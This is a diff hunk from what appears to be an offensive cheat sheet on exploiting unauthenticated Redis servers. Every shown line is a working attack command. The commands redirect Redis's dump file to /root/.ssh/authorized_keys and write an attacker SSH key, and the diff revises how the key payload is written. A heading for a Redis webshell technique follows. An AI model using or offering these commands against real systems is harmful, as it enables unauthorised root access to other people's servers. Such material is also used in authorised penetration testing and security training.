@@ -76,7 +76,8 @@ redis-cli -h <target> KEYS *
 # SSH key write for RCE
 redis-cli -h <target> CONFIG SET dir /root/.ssh
 redis-cli -h <target> CONFIG SET dbfilename authorized_keys
-redis-cli -h <target> SET payload "\n\nssh-rsa AAAA...your_key...\n\n"
+printf '\n\nssh-rsa AAAA...your_key...\n\n' > /tmp/redis_key
+redis-cli -h <target> -x SET payload < /tmp/redis_key
 redis-cli -h <target> SAVE
 
 # Webshell via Redis
